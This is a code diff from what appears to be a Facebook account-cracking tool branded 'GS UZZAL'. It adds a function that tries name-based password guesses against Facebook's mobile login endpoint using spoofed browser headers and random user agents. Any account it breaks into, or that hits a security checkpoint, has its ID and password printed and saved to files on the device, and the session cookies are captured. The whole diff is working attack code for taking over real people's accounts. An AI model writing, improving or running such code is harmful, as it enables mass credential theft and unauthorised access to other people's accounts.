@@ -674,7 +674,7 @@ def menu():
 				elif mthd in ['8','08']:
 					crack_submit.submit(ffb6,ids,names,passlist)
 				elif mthd in ['9','09']:
-					crack_submit.submit(ffb9,ids,names,passlist)
+					crack_submit.submit(ffb7,ids,names,passlist)
 				
 				else:
 					crack_submit.submit(api,ids,names,passlist)
@@ -1448,6 +1448,49 @@ def ffb6(ids,names,passlist):
 		time.sleep(20)
 	loop+=1
 		
+def ffb7(ids,names,passlist):
+	global loop,oks,cps
+	sys.stdout.write('\r\r\033[1;37m[GS UZZAL] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+	session = requests.Session()
+	try:
+		first = names.split(' ')[0]
+		try:
+			last = names.split(' ')[1]
+		except:
+			last = 'Khan'
+		ps = first.lower()
+		ps2 = last.lower()
+		for fikr in passlist:
+			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
+			ua = random.choice(ugen)
+			
+			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
+			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
+			SHAHBAZ=session.cookies.get_dict().keys()
+			if "c_user" in SHAHBAZ:
+				coki=session.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+				print('\r\r\033[1;32m[GS UZZAL-OK] %s | %s'%(ids,pas))
+				
+				open('/sdcard/GS UZZAL-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				oks.append(ids)
+				break
+			elif 'checkpoint' in SHAHBAZ:
+				if 'y' in pcp:
+					print('\r\r\x1b[38;5;208m[GS UZZAL-CP] '+ids+' | '+pas+'\033[1;97m')
+					
+					open('/sdcard/GS UZZAL-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					cps.append(ids)
+					break
+				else:
+					break
+			else:
+				continue
+	except requests.exceptions.ConnectionError:
+		time.sleep(20)
+	loop+=1
 
 def menu_apikey():  
   uuid = str(os.geteuid()) + str(os.getlogin()) + str(os.getlogin()) +str(os.geteuid())
